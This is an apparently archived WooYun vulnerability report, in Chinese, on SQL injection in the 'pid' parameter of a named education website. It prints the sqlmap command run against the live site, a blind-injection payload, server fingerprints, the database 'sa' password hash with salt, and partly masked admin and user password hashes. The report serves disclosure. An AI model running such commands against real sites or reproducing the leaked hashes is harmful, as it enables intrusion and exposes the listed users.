wybug_title: 我要自学网存在sql注射漏洞致用户信息泄露
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2015-11-11：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-12-26：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 好危险啊 详细说明：  G:\Python27\sqlmap>sqlmap.py -u http://www.51zxw.net/gp_buy.aspx?pid=526[*] starting at 13:00:03[13:00:03] [INFO] resuming back-end DBMS 'microsoft sql server'[13:00:03] [INFO] testing connection to the target URL[13:00:04] [INFO] checking if the target is protected by some kind of WAF/IPS/IDSsqlmap resumed the following injection point(s) from stored session:---Parameter: pid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: pid=526 AND 9069=9069---[13:00:05] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005   漏洞证明：  database management system users password hashes:[*] sa [1]:    password hash: 0x01004086ceb6068a82024faf20b6b06588bea1a1c367810dae3e        header: 0x0100        salt: 4086ceb6        mixedcase: 068a82024faf20b6b06588bea1a1c367810dae3e--------------------------------------------------------------------管理员和用户信息的一部分admin|1A2B1AEC1C768418****85865FF3F3E7zyok888|565ABC8EEE86E39****4B110816CD47EJeson|84EE6E291B692BB2BF****0C93D9DAEBsamohu|C6BF57CC6AC90B1043****5BDAF3E3BEfyunzhanshi|5E46E71EDC897****0DE35252311CAB0yang242970|99DAA3AB67293E****B6796957E7B63Bneosong|E9267B2E34EAF9BA7****D2DF9FEB651feng|0BFC99C85398335C9F3****2425A884hjs|3BEAA4C66E440E64188****58DAB3D0C------------------------------------------------   修复方案：  要过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
